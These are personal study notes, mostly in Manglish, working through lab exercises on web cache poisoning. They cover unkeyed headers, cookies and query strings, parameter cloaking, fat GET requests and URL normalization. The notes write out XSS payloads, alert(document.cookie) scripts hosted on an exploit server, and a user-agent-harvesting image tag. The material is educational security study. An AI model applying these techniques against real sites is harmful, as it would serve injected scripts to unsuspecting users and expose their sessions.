### Web cache poisoning :
-->web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims.
-->oru http request il cach nokunath athinte request url um pine host header umayirikum. adayath njn firfox il ninum site use chyth vere oral chrome il ninum use chyunengilum aa same cache il ninuthane response kitum karanam cache useagent cookie nokunila.
-->ingane cache aakuna request il cache check chyatha parameters undakum like cookie:language=en;  ennanengil vere oru user in response spanish bhashayil aan venegilum cache il ninu varunath ee english enna cookie ulla request  aayirikum karanam cacha langaue cookie check chyunila
-->unkeys ennal parameter value mathramalla hedersum athinte values oke athil pedum.ee headers um values onum cach chyumbol check chyarila
-->cache key ennal cache enthoke karyanal aan check chyunath.sadharana method,url,host ithoke aan nokuka.so ithoke aa cache key
-->so ithupolula unkeyed input namal kandethanam.paramminer enna extension use chyth ela request ilum search chyam.chela request il parameters hidden aayirikum
-->==requests test chyumbol  /en?safe=1  enno mato pathil kodukuka apol athava namude attack work aakumengilum ath real users ine bhadhikilan thonun==
-->http header il age: 40  enna header undakum athil ninum namuk manasilakan patum chache inte expiry.angane aanenn thonunu
-->vary: user-agent,accept-encoding . ingane vary enna header kandal athinartham user-agent enna header namal cache key il ulpeduthanam
-->x-cache: hit ennal namuk response kitunath cache il ninan .miss ennanengil website il ninan response kitunath
-->The cache sits between the server and the user, where it saves (caches) the responses to particular requests, usually for a fixed amount of time.If another user then sends an equivalent request, the cache simply serves a copy of the cached response directly to the user, without any interaction from the back-end. This greatly eases the load on the server by reducing the number of duplicate requests it has to handle


          Lab-1(Web cache poisoning with an unkeyed header)
-->namal lab il keruka.aa website load chyuna athayath /GET / request burp http history il kanam
-->so athinte response oke nokuka.ath repeater il viduka.eni athil oru cachebudter (/?cb=1)iduka pathil so angane athava namude exploit work aayalum ath mattu usersine bhadikilla ok
-->ini namuk enth venam ennal oru unkeyed input undon kandupidikanam.namal enthengilum ee request il koduthit ath response il reflect chyunundon kandupidikanam
-->so x-forwarded-host: example.com enn koduth send adikuka(along with /?cb=122) apol namude explample.com ennath oru url path aayi reflect chyapedunath kanam.ee header il kodukunath oru dynamic url aayi marum athu example.com/resources/js/tracking.js  il ninum entho javascript file edukunu
-->oru karyam parayan maranu ee lab caching 30 seconds expiry aakum.so oru pravisham request chythal x-cache: miss enn varum so namal onudi same request send chyanam apol miss mari hit aakum apozhe namuk ath cachil nin varunathanen confirm chyan patu
-->so ini namal exploit server il poikuka enit namal ithe /resources/js/tracking.js il oru file undakuka enit body il alert(document.cookie) enn koduth save chyuka.
-->NOTE: exploit server ennal namal control chyuna website pole aan.so ini vere user ee same reqeust , request chyumbol namal control chyuna ee serveril ninum ulla /resources/js/tracking.js il ninum namude malicious file edukum
-->so ini request il poi cachebuster remove chyuka.enit x-forwarded-for: il namal control chyuna server link kodukuka enit send adich hit varunath vere send adikuka apol ee response cache il save aakum
-->ini browser il poi home page refresh chyuka.apol alert(body il alert(9) enn koduthamathi) pop aakum. lab solve aayi
-->NOTE:==ivide exploit server il aan chyunanth but real life il angane chyandan thonun karanam cache il alle aakunath athukond areela==

==============================================================

           Lab-2(Web cache poisoning with an unkeyed cookie)
-->namal lab open chyuka enit burp open chyth website onudi refresh chyuka
-->so aa page inte /GET / request eduth repeater il iduka
-->aa request il  `fehost=prod-cache`  enn cookie undakum so aa request onum chyath send adikuka apol response il kanam aa prod-cache enna string oru javascript object il reflect aayi kidakunath
-->so aa prod-cache ennath maati vere enthengilum string kodukuka apol athum reflect aakunund
-->so namuk ithil oru xss test chyth nokam.so aadyam cachebuster iduka ie,?cb=1.apol athava xss trigger aayalum mattu users ine ath bhadhikunila.illengi aa chache expiry aakunath vere aa payload trigger aakum
-->so aa fehost enna cookyil `fehost=someString"-alert(1)-"someString`    enna kodukuka enit send chyuka ath reflect aakunund
-->so aa response right click chyth show response in browser click chyth browser il poi itt check chyuka xss akunundon.so aakunund
-->ini aa cachebuster remove chyth onukoodi same steps chyuka apol sherikum aa /GET / request il cache poisoning aakum.so lab solve aayi

==============================================================

             Lab-3(Web cache poisoning with multiple headers)  -not completed
-->lab open chyuka enit `/resources/js/tracking.js` ee path ulla /GET request eduth repeateril iduka
-->enit oru cache buster kodukuka.enit x-forwarded-host: example.com enn kodukumbol response il prathyekich onum kanan ila
-->so x-forwarded-scheme: http enn kodukunu ath kore pravisham send adikuka apol 200OK response maari 302 moved permenantly enn kanum.athil location https://siteurl  enn kanam
-->so ini x-forawarded-scheme inte koode x-forwarded-host: attacker.com enn kodukuka apool namuk open redirection nadakunath kanam.(x-forwarded-schem: nohttps enn kodukanam)
-->ini namuk nerthe pole exploit server il vanit body il alert(2) enn koduth file path ee request inte path kodukuka
-->ini namude repeater il poi server inte url x-forwarded-host il kodukuka enit x-cache: hit enn varunath vere send adikuka
-->lab solve aakan cache buster remove chythit send adich x-cache: hit vere chyuka apol poisoning nadakum

==============================================================

        Lab-4(Targeted web cache poisoning using an unknown header) - cant solve
-->namal lab open chyuka enit aa home page refresh chyuka burp histrory il poi /GET / request eduth repeater il iduka
-->right click chyth param miner inte guess header select chyuka.extender tab il poi output select chythal namuk kanan patum enthoke result kitunu enn
-->apol kanan patum x-host enna header hidden aayit aa request il use chyunund
-->so oru cachebuster pathil kodukua enit ee x-host: example.com ennadich send chyuka (aadyam request send adich x-cache: hit varuthanam)
-->ee example.com enna string oru url il dynamic aayi add chythirikuakayaan.so ee url il ninum entho javascript file retrieve chyukayan application ie, `example.com/resources/js/tracking.js`
-->so ini namal server il poi `/resources/js/tracking.js`  filename kodukuka apol namude server il ninum javascript file application edukum.but application areela ithala application venda js file enn .enit body il alert(document.cookie) koduth store chyuka
-->ini x-host: exploit server urlpath kodukuka enit send chyuka. x-cache: hit enn verunath vere send chyuka
-->ini notice chyuka response il vary: useragent  enn kanam.so athinartham useragent keyed aan
-->so ini site il blog post il comment iduna sthalath html injection chyan patum so : `<img src="https://your-exploit-server-id.web-security-academy.net/foo" />`   enn koduth save chyuka
-->so ini expoit server il poi access log click chyuka apol avide vech kananan patum namude victim use chyuna user agent ethanen
-->so ath copy chyth repeaterile request il poi aa corresponding header il paste chyuka enit cachebuster remove chyuka enit send chyuka x-cache: hit kitunathvere
-->ipol cache poisoned aayi.lab solve aayikolum

==============================================================

           Lab-5(Web cache poisoning via an unkeyed query string)
-->namal lab open chyuka enit aa site inte GET request edukuka enit repeater iduka
-->ini namuk aa GET /   il oru query parameter koduth test chyam ie, /?hello=josu 
-->ini ee reqeust send chyuka hit maari miss kitunath vere.miss kitiyal athinartham namuk website il ninuman response vanath.so ini namal ee hello=josu enna parameter remove chythit send adichalum josu enna value aa cache expire aakunath vere reflect chyum.so athinartham ee query parameter unkeyed aan and cache il ninum namuk response tharunumund
-->ivide namuk origin: hacker    header cachebuster aayi use chyan patum so request il inane iduka apol namal test chyunath mattu user ine bhadikila
-->njan already paranju namal kodukuna query parameter response il reflect chyunund athupole miss kitiyathin shesham ath cache il ninan varunathen so ee origin header use chyth namuk ee query parameterinte value oru xss payload kodukam
-->`GET /?evil='/><script>alert(1)</script>`   ithupole xss kodukuka enit miss varunath vere send adikuka enit miss kitiyathin shesham kanam namuk pine cache il ninan (x-cache: hit) response varunath
-->so hit kitiyal aa response right click chyth show response in browser select chyth nokuka apol namuk xss work aakunath kanam.ini namuk cache poison chyam athin cachebuster aayi use chyth origin header remove chyuka enit same process chyuka enit hit kitum bol lab il vann refresh adichal xss trigger aakum.so lab solve aayi

==============================================================

          Lab-6(Web cache poisoning via an unkeyed query parameter)
-->ivide namal lab open aaki.enit GET /    request eduth repeater il iduka enit param miner il guess header select chyuka
-->enit namal query stringil enthengilum puthiya parrameter itt send chyth nokam.apol namuk kanam /?kk=jsou&jj=shajan   ennath response il reflect aakunund pakshe cache: miss ennan kanunath.This indicates that it is part of the cache key
-->namal puthuthayi enth unkey cherth poison undon check chyumbol namuk hit aan kitendath ilengil ath direct application il ninan response varunath hit il ninanengil mathrame cache iilninanen manasilakan patu
-->so hit kitathidatholam kalam namuk cache posoning ine pati chinthikenda karyam ila
-->ini param miner guess header right click chyth select chyuka.apol namuk kanam `utm_content` enn parameter supported aan
-->so   query string il /?kk=josu&utm_content=shajan  enn koduth send chyuka apol aadyam miss enn varum onnudi send chyuka apol hit enn kanum
-->so ipol ith cache il ninan varunath.athpole `utm_content` ulla value reflect chyunund.so ini namuk ee value il xss kodukam apol xss trigger aakum
-->so  `GET /?utm_content='/><script>alert(1)</script>`    enn koduth send kore adich miss kitunath vere adikuka.age: 0  aakunath aadyam nokuka apol puthiya response kitum
-->ini send adikumbol hit kanum enit show response in browser adikumbol namuk kanam xss trigger ayirikunath.so lab solve aayi

==============================================================

                    Lab-7(Parameter cloaking)
-->lab open chyuka enit ithil   `/js/geolocate.js?callback=setCountryCookie`   enna oru javscript file GET vazhi edukunath http history il kanam.history il thane itine response nokiyal kanam ithin hit oke kanikunund
-->so ith repeateril viduka enit right click chyth param miner->rails param clocking scan selec chyuka
-->ini target il vann nokiyal kanan patum web cache poisoning: parameter cloacking enn so athil thane request il kanikum utm_content enna parmeter koduthitund
-->ivide utm_content enn parameter value server check chyunila so ith unkeyed cache aan. so cache il nin thane respones varunu
-->ivide ee js file request noku.ee request oru callback funetion call chyunund. 
sercountrycookie() enna function execute chyununu
-->ivie `GET /js/geolocate.js?callback=setCountryCookie`   enna callback parameter value sredhikuka.namal athile value maati vere enthengilum kodukua enit send adich nokuka like =test enn kodukuka enit send adikumbol hit enn kitunumun athupole ee test response il reflect aakunund
-->eni namuk ee parameter inte koode same onnukoodi cherth send adich nokam ie, `...cate.js?callback=setCountryCookie&callback=shajan`  enn kodukumbol shajan enna second parameter value aan reflect chyunath response il
-->==so ee randamathe callback unkeyed aano ennarinjale namuk poison chyan patu.so aadyam randamathe callback koduth shajan enn value koduth send chyuka enit aadyam miss kitum pine hit um kitum. ini enth chyanamennal ee randamathe callback parameter unkeyed aano enn nokan shajan enna value il vere enthengilum kodukuka like shajansomething enit send chyumbol kanam hit alla miss ennan kitunath so athinartham ee randamathe callbackum application key aayitan kanunath.unkeyed aanengil orikal hit kitiyal pine athinte value il vere enth koduthalum response cache il(hit) nin thane aan varuka.ivide ee randamathe callback key aan so first response kitya samath enthano value ath thane pineed undaknam enale hit il ninum response varum.ivide keyed aayath kond shajante koode something cherthathkond response cache il ninum varunila.athukond poison nadakila.so poison chyan iniyum test chyanam==
-->ivide namuk target->issue il namal kandu utm_content enn parameter burp il kanikunund.so `/js/geolocate.js?callback=test&utm_content=heloshajan`   enn koduth send chyuka aadyam miss kitum pinem send chyumbol hit il ninum response varum.so athinartham ee utm_content enna parameter keyed alla
-->ini enth chyanamenal ee utm_content ile value il shesham oru semicolon ittit namuk randamath oru callback parameter kodukam enit athinte value enthengilum kodukuka 
`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=mrbean` enit send adkikuka.apol aadyam miss kitum pine hit kitum.mrbean ennath reflect chyunumund.
-->ini enth venamenal ee last ulla callback parameter keyed ano enn nokanam athin nammal mrbean shesham enthengilum kodukuka like mrbeansomething apol ee parameter keyed aanengil namuk miss kitum illengil cache il ninum thane response kitum
-->ivide hit il ninum thane aan response kitunath.mrbean cache il save aayikazhinju.so ini athinte koode enth koduthalum cache il nin thane varunah kond mrbean enn mathrame reflect chyu
-->so namal unkeyed aaya parameter kandethi ini ithil namuk xss oo enthengilum payload koduth save chyam apol poison aayikolum ie,
`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`
-->ivide alert koduth cache il save aaki so ini ee alert pop aaikolum.lab il poi page refresh chythal xss tirgger aakum lab um solve aakum

==============================================================

        Lab-8(Web cache poisoning via a fat GET request)
-->ivide lab open chyuka.enit home page inte request history il nokuka athil kanam : `GET /js/geolocate.js?callback=setCountryCookie`  enna request 
-->ee request oru call back fundtion vilich execute chyukayan
-->so ith repeater il iduka.ith oru GET request aan.so satharana GET request il body undakila (athayath POST request il thazhe aayi kanuna parameters okke)
-->ivide ulla ee request il namuk body idan patunund.so callback enna oru parameter thazhe aayi iduka (ie, callback=josu)enit send adikuka.age: 35 aakumbol cache expire aakum
-->so expire aayikazhinj veendum send chyuka apol namuk kanam josu enna string repsonse il reflect aakunund
-->ini namal send adikumbol hit il ninuman response varunath
-->so josu maati `alert(1)`   enn iduka enit nerthe pole thane chyuka 
-->hit il ninum response vannal.nere browser ilek pokuka home page refresh chyuka apol alert pop up aakunath kanam

==============================================================

                  Lab-9(URL normalization)
-->ivide namal home page inte GET / requset eduth repeater il iduka
-->ithil /josu   enn koduthal error varum pakshe josu response il `<p>josu</p>`  enn kanikum
-->so oru xss payload pathil itt kodukuka ie,`GET /random</p><script>alert(1)</script><p>foo`   
-->ini response copy chyth browser il paster chythal ee xss trigger chyilla
-->but ee request send chyth miss maati hit aaki cache poison chyuka enit response copy chyth browser il paste chythal xss trigger aakum
-->the `alert()` is executed because the browser's encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request
-->athin shesham ee request inte link copy chyth browser il submit aakiyal lab solve aayi

==============================================================

           Lab-10()